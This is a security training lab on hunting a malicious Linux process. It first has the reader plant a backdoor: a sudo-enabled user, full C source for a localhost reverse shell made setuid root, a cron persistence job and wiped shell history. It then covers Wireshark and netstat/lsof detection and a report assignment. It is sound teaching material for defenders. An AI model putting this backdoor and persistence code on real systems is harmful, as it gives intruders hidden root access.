# Linux Network Hunting Lab
In order for us to do a local hunt for a malicious Linux process, we have to make ourselves a malicious process. 

## Create Evil 

First let's pretend we are a bad guy who just got access to a box and are taking our first persistence steps. 

```
$ adduser backdooruser (and create new user)
$ usermod -aG sudo backdooruser
$ su - backdooruser
```

Next place the following code for a reverse shell into a file named mal.c and save it in your /bin directory:

```
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 1337;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

Then run the following commands:

```
$ gcc mal.c -o /bin/mal 
$ rm mal.c
$ sudo chmod u+s /bin/mal
$ sudo crontab -e

```

Add line to cron file and save to set up the cron job: 

```
*/5 * * * * /bin/mal
```

Once you have that done step out of the ```su``` back to your normal user and run ```$ nc -lp 1337 ``` and in another window run ```$ /bin/mal```.

You should have a root shell connect back. Confirm that this works before moving forward. 

Now let's clear out our command history with ```cat /dev/null > ~/.bash_history```, because we are sneaky little backdoor hiders.

Kill the connection and start listening again.

# Network Hunting 

We can use network traffic to identify evil, in fact, it just might be the easiest way to initially detect something without having to go look for it.

If malware is on your network, it is going to try to talk out to its command and control server. There are plenty of ways to look at network traffic, especially if you are a larger organization that has a security monitoring setup like SecurityOnion.

## Hunting Packet Captures

This is the more common form of network hunting. Rather than being on the potentially compromised box itself, we can just look at the packets captured and search through it to find evil. This is the bread and butter of most organization's defensive posture.

Set up Wireshark and begin capturing on the localhost interface (this is essential because your reverse shell is heading to 127.0.0.1 and will not wind up leaving the main interface. Wait for your reverse shell to connect and then use the nc listener to run a few commands. Use ?wget https://st2.depositphotos.com/1000393/6507/i/950/depositphotos_65076917-stock-photo-hacker-and-terrorism-fight.jpg? as one of your commands. 

Use the Wireshark capture you generated to find the malicious process and data that was passed back and forth. 

## Local Network Hunting 

Locally, it should be easy to identify both your listening and connected processes using the following commands. They all do something slightly different but are very useful.

* netstat -antp
* netstat -la | grep ?LISTEN? ?ESTABLISHED?
* lsof -u 
* lsof -i

In the real world, we could set up a log monitoring system that would check these sort of things on a regular basis but that is overkill for a single host.

## Everyday Hunting

For everyday use on a Linux box I recommend the tool ntopng and Wireshark for this purpose. ntop identifies processes making network connections and alerts on them. If the process doesn't make sense when it pops up, go to Wireshark and open up the stream to see if it makes sense.
 
Assignment: 

0. Make sure you understand what the attacker did and why. Try to understand what the effect was of each command the attacker ran. This is some pretty complicated stuff. 
1. Write up a minimal report on the malicious actions taken by the attacker as well as information about the backdoor, according to the packet capture and the networking commands used. Include information from the command outputs' and Wireshark to provide detail. Do not go any further than this lab's content in your writeup.
